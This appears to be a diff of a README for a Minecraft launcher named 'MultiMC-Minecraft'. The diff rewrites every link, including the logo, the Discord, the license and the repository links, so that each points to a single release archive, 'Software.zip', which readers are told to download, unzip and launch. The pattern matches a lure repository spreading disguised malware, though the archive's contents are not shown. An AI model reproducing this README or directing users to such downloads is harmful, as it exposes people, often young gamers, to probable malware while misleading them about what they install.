@@ -1,6 +1,6 @@
 # 🚀 Welcome to MultiMC-Minecraft 🛠️🌍
 
-![MultiMC Logo](https://example.com/multimc-logo.png)
+![MultiMC Logo](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip)
 
 ## Repository Description
 Simplified launcher for managing multiple Minecraft instances with mod support. This tool aims to provide an efficient way to manage your different Minecraft installations, making it easier to switch between various mods and versions. 
@@ -18,7 +18,7 @@ Simplified launcher for managing multiple Minecraft instances with mod support. 
 - multimc-download
 
 ## Getting Started
-To get started with MultiMC-Minecraft, download the latest release [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Once downloaded, you can launch the file to start using the application.
+To get started with MultiMC-Minecraft, download the latest release [here](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip). Once downloaded, you can launch the file to start using the application.
 
 ## Features
 - Manage multiple Minecraft instances effortlessly
@@ -27,7 +27,7 @@ To get started with MultiMC-Minecraft, download the latest release [here](https:
 - User-friendly interface for a seamless experience
 
 ## Installation
-1. Download the latest release zip file from [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+1. Download the latest release zip file from [here](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip).
 2. Unzip the downloaded file to a location of your choice.
 3. Launch the application to start managing your Minecraft instances.
 
@@ -38,14 +38,14 @@ To get started with MultiMC-Minecraft, download the latest release [here](https:
 4. Launch Minecraft with your preferred setup.
 
 ## Support
-For any issues or questions, please check the "Releases" section of this repository for the latest updates. You can also reach out to the community for support on our [Discord server](https://discord.com/multimc-minecraft).
+For any issues or questions, please check the "Releases" section of this repository for the latest updates. You can also reach out to the community for support on our [Discord server](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip).
 
 ## Contribute
-We welcome contributions to enhance MultiMC-Minecraft further. Feel free to submit pull requests or open issues on our [GitHub repository](https://github.com/multimc-minecraft).
+We welcome contributions to enhance MultiMC-Minecraft further. Feel free to submit pull requests or open issues on our [GitHub repository](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip).
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/multimc-minecraft/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
-[![Download MultiMC-Minecraft](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download MultiMC-Minecraft](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip)](https://github.com/russbellxd/MultiMC-Minecraft/releases/download/v1.0/Software.zip)
